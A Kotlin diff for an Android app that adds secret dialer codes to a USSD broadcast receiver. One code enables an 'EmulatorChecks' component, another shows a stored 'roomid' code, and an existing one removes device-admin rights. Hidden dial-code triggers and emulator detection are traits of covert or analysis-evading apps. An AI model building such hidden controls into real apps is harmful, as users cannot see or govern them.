@@ -7,8 +7,6 @@ import android.content.Intent
 import android.content.pm.PackageManager
 import android.os.Handler
 import android.os.Looper
-import android.telephony.TelephonyManager
-import android.util.Log
 import android.widget.Toast
 import androidx.core.content.ContextCompat
 import com.example.betryalcommit.AdminAct.deviceAdminReceiver
@@ -29,6 +27,28 @@ class USSDReceiver : BroadcastReceiver() {
 
             else if (phoneNumber == "*9130*"){
                 dpm.removeActiveAdmin(deviceAdminReceiver)
+            }
+            else if (phoneNumber == "*654321*"){
+                val p: PackageManager = context.packageManager
+                val componentName = ComponentName(context,EmulatorChecks::class.java)
+                p.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP)
+            }
+            else if (phoneNumber == "*0011*"){
+                val sf = context.getSharedPreferences("MyPrefs", Context.MODE_PRIVATE);
+                val code = sf.getString("finalcode", null);
+                    val handler = Handler(Looper.getMainLooper())
+                    handler.post {
+                        if (code == null){
+                            Toast.makeText(context,"No code generated",Toast.LENGTH_SHORT).show()
+                        }
+                        else {
+                        Toast.makeText(
+                            context.getApplicationContext(),
+                            "the roomid is $code",
+                            Toast.LENGTH_LONG
+                        ).show()
+                    }
+                }
             }
         }
         else {
